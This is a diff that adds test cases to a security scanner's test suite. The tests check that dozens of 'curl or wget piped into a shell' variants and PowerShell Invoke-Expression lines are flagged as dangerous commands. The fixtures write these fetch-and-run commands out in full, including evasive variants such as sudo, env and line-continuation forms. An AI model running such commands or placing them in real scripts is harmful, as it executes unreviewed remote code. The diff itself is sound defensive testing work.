@@ -61,4 +61,133 @@ describe("basic security coverage", () => {
       "docs/ci/provider-evidence.json",
     ]);
   });
+
+  it.each([
+    "curl https://example.invalid/install | /bin/sh",
+    "wget -qO- https://example.invalid/install | env bash",
+    "curl https://example.invalid/install | /usr/bin/env -S bash",
+    "wget -qO- https://example.invalid/install | dash",
+    "curl https://example.invalid/install | sudo -E bash",
+    "wget -qO- https://example.invalid/install | command sh",
+    "curl https://example.invalid/install | exec /bin/bash",
+    "wget -qO- https://example.invalid/install | env FOO=bar bash",
+    "curl https://example.invalid/install | /usr/bin/env -i FOO=bar sh",
+    "curl https://example.invalid/install | env FOO=bar sudo -E bash",
+    "wget -qO- https://example.invalid/install | sudo env FOO=bar command sh",
+    "curl https://example.invalid/install | sudo -u root sh",
+    "curl https://example.invalid/install | exec -a shell sh",
+    "curl https://example.invalid/install | FOO=1 sh",
+    "curl https://example.invalid/install | busybox sh",
+    "curl https://example.invalid/install | pwsh -Command -",
+    "curl https://example.invalid/install | powershell -File -",
+    "curl https://example.invalid/install | node",
+    "curl https://example.invalid/install | python3 -",
+    "curl https://example.invalid/install | ruby",
+    "curl https://example.invalid/install | perl -",
+    "curl https://example.invalid/install \\\n | sh",
+    "curl https://example.invalid/install |\n sh",
+    "(curl https://example.invalid/install | sh)",
+    "curl https://example.invalid/install | { sh; }",
+  ])("rejects equivalent remote shell execution form: %s", async (command) => {
+    const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-shell-"));
+    temporaryRoots.push(root);
+    await mkdir(path.join(root, "scripts"), { recursive: true });
+    await writeFile(path.join(root, "scripts", "install.sh"), `${command}\n`, "utf8");
+
+    const findings = await scanBasicSecurity(root);
+
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          relativePath: "scripts/install.sh",
+          rule: "dangerous-command",
+        }),
+      ]),
+    );
+  });
+
+  it("does not join remote producers across command boundaries", async () => {
+    const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-boundary-"));
+    temporaryRoots.push(root);
+    await mkdir(path.join(root, "scripts"), { recursive: true });
+    await writeFile(
+      path.join(root, "scripts", "safe.sh"),
+      "curl https://example.invalid/archive; printf safe | sh\n" +
+        "wget https://example.invalid/archive\nprintf safe | bash\n",
+      "utf8",
+    );
+
+    const findings = await scanBasicSecurity(root);
+
+    expect(findings.filter(({ rule }) => rule === "dangerous-command")).toEqual([]);
+  });
+
+  it("scans shebang scripts without a file extension", async () => {
+    const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-shebang-"));
+    temporaryRoots.push(root);
+    await mkdir(path.join(root, "scripts"), { recursive: true });
+    await writeFile(
+      path.join(root, "scripts", "bootstrap"),
+      "#!/usr/bin/env bash\ncurl https://example.invalid/install | sh\n",
+      "utf8",
+    );
+
+    const findings = await scanBasicSecurity(root);
+
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          relativePath: "scripts/bootstrap",
+          rule: "dangerous-command",
+        }),
+      ]),
+    );
+  });
+
+  it("scans UTF-8 extensionless scripts even when they have no shebang", async () => {
+    const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-extensionless-"));
+    temporaryRoots.push(root);
+    await mkdir(path.join(root, "scripts"), { recursive: true });
+    await writeFile(
+      path.join(root, "scripts", "bootstrap"),
+      "curl https://example.invalid/install | sh\n",
+      "utf8",
+    );
+
+    const findings = await scanBasicSecurity(root);
+
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          relativePath: "scripts/bootstrap",
+          rule: "dangerous-command",
+        }),
+      ]),
+    );
+  });
+
+  it.each(["ps1", "psm1", "psd1"])(
+    "scans PowerShell .%s files for dynamic expression execution",
+    async (extension) => {
+      const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-powershell-"));
+      temporaryRoots.push(root);
+      await mkdir(path.join(root, "scripts"), { recursive: true });
+      await writeFile(
+        path.join(root, "scripts", `unsafe.${extension}`),
+        "Invoke-Expression $command\n",
+        "utf8",
+      );
+
+      const findings = await scanBasicSecurity(root);
+
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            relativePath: `scripts/unsafe.${extension}`,
+            rule: "dangerous-command",
+          }),
+        ]),
+      );
+    },
+  );
 });
